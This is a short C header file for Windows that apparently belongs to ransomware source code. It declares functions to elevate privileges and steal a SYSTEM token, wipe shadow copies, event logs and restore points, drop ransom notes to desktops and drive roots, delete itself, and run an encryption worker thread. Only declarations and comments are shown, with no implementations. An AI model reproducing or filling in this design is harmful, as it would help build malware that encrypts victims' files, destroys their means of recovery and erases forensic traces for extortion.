#pragma once
#include <windows.h>

/* Elevate all privileges + try to steal SYSTEM token */
void ElevatePrivileges(void);

/* Nuke VSS, event logs, restore points */
void NukeBackups(void);

/* Drop ransom notes to desktop, all-users desktop, and drive roots */
void DropNote(void);

/* Self-delete via cmd /c timeout */
void SelfDelete(void);

/* Encryption worker thread proc */
unsigned __stdcall EncryptionWorker(void *arg);